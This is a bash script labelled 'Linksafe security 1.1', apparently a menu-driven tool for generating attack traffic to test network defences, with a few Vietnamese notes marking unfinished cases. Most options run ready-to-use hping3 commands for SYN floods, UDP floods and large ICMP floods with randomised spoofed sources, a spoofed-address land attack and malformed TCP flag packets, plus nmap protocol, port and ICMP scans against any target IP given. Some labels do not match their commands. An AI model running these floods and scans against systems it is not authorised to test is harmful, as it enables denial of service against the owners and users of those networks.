#! /bin/bash
if [ -z "$1" ];then
	echo "Linksafe security 1.1"
	echo "Please choose number of attack:"
	echo "1. IP Fragments Overlap"
	echo "2. Land attack"
	echo "3. Fragmented ICMP Traffic"
	echo "4. Large ICMP Traffic*"
	echo "5. TCP NULL flags*"
	echo "6. TCP SYN+FIN flags*"
	echo "7. TCP FIN flags*"
	echo "8. TCP SYN+RST flags*"
	echo "9. UDP Bomb*"
	echo "10. UDP Chargen DoS"
	echo "11. Flooding a host (ví dụ: Smurf, Ping Flood, SYN flood)"
	echo "12. Flooding a network*"
	echo "13. IP protocol scanning*"
	echo "14. TCP port scanning*"
	echo "15. UDP port scanning*"
	echo "16. ICMP scanning"
else
	case "$1" in
	"1")
		echo "1. IP Fragments Overlap"
		echo "chua co test case"
		;;
	"2")
		if [ -z "$2" ] || [ -z "$3" ] || [ -z "$4" ]; then
			echo "2. Land attack"
			echo "Usage: scenario_attack.sh 2 [src_ip] [dst_port] [dst_ip]"
		else
			sudo hping3 -p $3 $2 -a $4
		fi
		;;
	"3")
		echo "3. Fragmented ICMP Traffic"
		echo "chua co test case"
		;;
	"4")
		if [ -z "$2" ] || [ -z "$3" ]; then
			echo "4. Large ICMP Traffic*"
			echo "Usage: scenario_attack.sh 4 [dst_ip] [dst_port]"
		else
			sudo hping3 -c 100000 -d 99999 --rand-source --flood --icmp -p $3 $2
		fi
		;;
	"5")
		if [ -z "$2" ] || [ -z "$3" ]; then
			echo "5. TCP NULL flags*"
			echo "Usage: scenario_attack.sh 5 [dst_ip] [dst_port]"
		else
			sudo hping3 $2 -p $3
		fi
		;;
	"6")
		if [ -z "$2" ] || [ -z "$3" ]; then
			echo "6. TCP SYN+FIN flags*"
			echo "Usage: scenario_attack.sh 6 [dst_ip] [dst_port]"
		else
			sudo hping3 -S -F $2 -p $3
		fi
		;;
	"7")
		if [ -z "$2" ]; then
			echo "7. TCP FIN flags*"
			echo "Usage: scenario_attack.sh 7 [dst_ip]"
		else
			sudo hping3 -F $2
		fi
		;;
	"8")
		if [ -z "$2" ] || [ -z "$3" ]; then
			echo "8. TCP SYN+RST flags*"
			echo "Usage: scenario_attack.sh 8 [dst_ip] [dst_port]"
		else
			sudo hping3 -S -R $2 -p $3
		fi
		;;
	"9")
		if [ -z "$2" ] || [ -z "$3" ]; then
			echo "9. UDP Bomb*"
			echo "Usage: scenario_attack.sh 9 [dst_ip] [dst_port]"
		else
			sudo hping3 --flood --rand-source --udp -p $3 $2
		fi
		;;
	"10")
		echo "10. UDP Chargen DoS"
		echo "chua co testcase"
		;;
	"11")
		if [ -z "$2" ] || [ -z "$3" ]; then
			echo "11. Flooding a host (ví dụ: Smurf, Ping Flood, SYN flood)"
			echo "Usage: scenario_attack.sh 11 [dst_ip] [dst_port]"
		else
			sudo hping3 -S -p $3 --flood $2
		fi
		;;
	"12")
		if [ -z "$2" ] || [ -z "$3" ]; then
			echo "12. Flooding a network*"
			echo "Usage: scenario_attack.sh 12 [dst_ip] [dst_port]"
		else
			sudo hping3 -S -p $3 --flood $2
		fi
		;;
	"13")
		if [ -z "$2" ]; then
			echo "13. IP protocol scanning*"
			echo "Usage: scenario_attack.sh 13 [dst_ip]"
		else
			sudo nmap -sO $2
		fi
		;;
	"14")
		if [ -z "$2" ]; then
			echo "14. TCP port scanning*"
			echo "Usage: scenario_attack.sh 14 [dst_ip]"
		else
			sudo nmap -p 1-1000 -sX $2
		fi
		;;
	"15")
		if [ -z "$2" ]; then
			echo "15. UDP port scanning*"
			echo "Usage: scenario_attack.sh 15 [dst_ip]"
		else
			sudo nmap -sU $2
		fi
		;;
	"16")
		if [ -z "$2" ]; then
			echo "16. ICMP scanning"
			echo "Usage: scenario_attack.sh 16 [dst_ip]"
		else
			sudo nmap -PE $2
		fi
		;;
	esac
fi
